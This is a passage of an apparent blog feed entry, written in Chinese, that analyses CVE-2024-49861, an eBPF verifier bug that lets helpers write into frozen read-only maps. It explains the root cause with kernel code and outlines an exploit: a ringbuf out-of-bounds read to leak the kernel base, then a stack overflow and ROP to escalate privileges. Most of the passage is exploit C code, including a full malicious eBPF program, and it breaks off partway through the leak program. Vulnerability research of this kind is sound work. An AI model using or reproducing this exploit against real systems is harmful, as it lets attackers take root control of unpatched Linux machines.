      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
      <tag>uaf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-49861 eBPF非法写入</title>
    <link href="/2025/08/05/cve-2024-49861/"/>
    <url>/2025/08/05/cve-2024-49861/</url>
    
    <content type="html"><![CDATA[<p>我需要褪黑素</p><span id="more"></span><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>尽管用户空间和BPF端已将BPF映射冻结为只读，但通过特定helpers仍可向其写入数据，因为这些辅助函数的参数标记为<code>ARG_PTR_TO_&#123;LONG,INT&#125;</code>。</p><p>proto中的arg_type表示helper对参数的要求以及helper会对参数进行的操作。比如在bpf_strtol的例子中，arg1需为一个指针，helper只对该内存进行读取。</p><p>如果需要对内存进行写入，需要额外标记MEM_UNINIT，表明允许传递未初始化内存的指针，因为后续会写入数据。但<code>ARG_PTR_TO_&#123;LONG,INT&#125;</code>本质上是ARG_PTR_TO_FIXED_SIZE_MEM的特例（额外要求对齐），并无MEM_UNINIT的标记。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_func_proto</span> <span class="hljs-title">bpf_strtol_proto</span> =</span> &#123;<br>.func= bpf_strtol,<br>.gpl_only= <span class="hljs-literal">false</span>,<br>.ret_type= RET_INTEGER,<br>.arg1_type= ARG_PTR_TO_MEM | MEM_RDONLY,<br>.arg2_type= ARG_CONST_SIZE,<br>.arg3_type= ARG_ANYTHING,<br>.arg4_type= ARG_PTR_TO_LONG,<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">BPF_CALL_4(bpf_strtol, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, buf, <span class="hljs-type">size_t</span>, buf_len, u64, flags,<br>   s64 *, res)<br>&#123;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> _res;<br><span class="hljs-type">int</span> err;<br><br>err = __bpf_strtoll(buf, buf_len, flags, &amp;_res);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>*res = _res;<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure><p>在check_func_arg中，当参数类型为<code>ARG_PTR_TO_&#123;LONG,INT&#125;</code>时，meta-&gt;raw_mode未被设置。随后，在check_helper_mem_access中，若寄存器基类型为PTR_TO_MAP_VALUE，该函数会默认假设操作为BPF_READ（helper只会对内存进行读取）并调用check_map_access_type。BPF映射是只读的，检查会错误地通过。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> PTR_TO_MAP_VALUE:<br>    <span class="hljs-keyword">if</span> (check_map_access_type(env, regno, reg-&gt;off, access_size,<br>                    meta &amp;&amp; meta-&gt;raw_mode ? BPF_WRITE :<br>                    BPF_READ)) <span class="hljs-comment">// meta-&gt;raw_mode not set</span><br>        <span class="hljs-keyword">return</span> -EACCES;<br>    <span class="hljs-keyword">return</span> check_map_access(env, regno, reg-&gt;off, access_size,<br>                zero_size_allowed, ACCESS_HELPER);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">check_map_access_type</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env, u32 regno,</span><br><span class="hljs-params"> <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> size, <span class="hljs-keyword">enum</span> bpf_access_type type)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_reg_state</span> *<span class="hljs-title">regs</span> =</span> cur_regs(env);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">map</span> =</span> regs[regno].map_ptr;<br>u32 cap = bpf_map_flags_to_cap(<span class="hljs-built_in">map</span>);<br><br><span class="hljs-keyword">if</span> (type == BPF_WRITE &amp;&amp; !(cap &amp; BPF_MAP_CAN_WRITE)) &#123;<br>verbose(env, <span class="hljs-string">&quot;write into map forbidden, value_size=%d off=%d size=%d\n&quot;</span>,<br><span class="hljs-built_in">map</span>-&gt;value_size, off, size);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br><br><span class="hljs-keyword">if</span> (type == BPF_READ &amp;&amp; !(cap &amp; BPF_MAP_CAN_READ)) &#123;<br>verbose(env, <span class="hljs-string">&quot;read from map forbidden, value_size=%d off=%d size=%d\n&quot;</span>,<br><span class="hljs-built_in">map</span>-&gt;value_size, off, size);<br><span class="hljs-keyword">return</span> -EACCES;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>主要的利用思路是先写入map一个value，然后freeze这个map。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">exp_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, BPF_F_RDONLY_PROG);<br><span class="hljs-keyword">if</span> (exp_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br><span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">0x10000</span>;<br>bpf_map_update_elem(exp_fd, &amp;key, buffer);<br><br>bpf_map_freeze(exp_fd);<br></code></pre></td></tr></table></figure><p>之后通过上述漏洞更改数值。由于map只读默认不会改变，所以在load ebpf程序时会直接使用原始值进行检查，但数值实际上发生了改变，利用数值不一致可以进行越界读写。</p><h2 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h2><p>ebpf ringbuf允许在程序中进行内存的申请。先写入0x10000再改成0x100，这样实际申请的大小是0x100，但verifier认为大小为0x10000，这样0~0x10000之间的读写偏移都会通过。</p><p>bpf_ringbuf_reserve申请的内存之间的间距是固定的，可以申请两块内存，利用第一块内存越界读写第二块内存的内容，泄露内核基址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">|-------------------| high<br>|     ringbuf_2     |<br>|-------------------|<br>|     hole        |<br>|-------------------|<br>|     ringbuf_1     |<br>|-------------------| low<br></code></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>写入8再改成0x200，skb_load_bytes向栈上写数据，这样实际写入大小为0x200但verifier认为是8，造成栈溢出。ROP提权。</p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_insn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size,</span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_flags)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_type = map_type,<br>                .key_size = key_size,<br>                .value_size = value_size,<br>                .max_entries = max_entries,<br>                .map_flags = map_flags,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_freeze</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_FREEZE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* next_key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .next_key = (<span class="hljs-type">uint64_t</span>)next_key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .info.bpf_fd = map_fd,<br>                .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>                .info.info = (<span class="hljs-type">uint64_t</span>)&amp;info,<br><br>        &#125;;<br>        bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>        <span class="hljs-keyword">return</span> info.btf_id;<br>&#125;<br><br><span class="hljs-type">int</span> sockets[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> map_fd, exp_fd, ringbuf_map_fd, leak_ringbuf_map_fd;<br><span class="hljs-type">int</span> leak_map_fd;<br><span class="hljs-type">int</span> leak_prog_fd, hack_prog_fd;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">hack_prog</span>[] =</span> &#123;<br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),    <span class="hljs-comment">// reg9 = ctx</span><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// STEP2: rop</span><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   <span class="hljs-comment">// reg2 = fp</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),    <span class="hljs-comment">// reg1 = exp_fd(4)</span><br><br>        <span class="hljs-comment">// map_lookup_elem(map_fd(4), fp - 4)</span><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),  <br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(8)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>),    <span class="hljs-comment">// reg1 = map_fd(3)</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg7 = ptr_to_value(&#x27;512&#x27;)</span><br>        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, <span class="hljs-number">8</span>),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0</span>),<br>        BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_strtol),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(0x200)</span><br>        <span class="hljs-comment">// reg7 = value(0x200)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, <span class="hljs-number">0</span>),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">0</span>),<br>        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="hljs-number">-8</span>),<br>        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_skb_load_bytes),<br><br>        BPF_EXIT_INSN(),<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">leak_prog</span>[] =</span> &#123;<br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),    <span class="hljs-comment">// reg9 = ctx</span><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// STEP1: leak</span><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   <span class="hljs-comment">// reg2 = fp</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        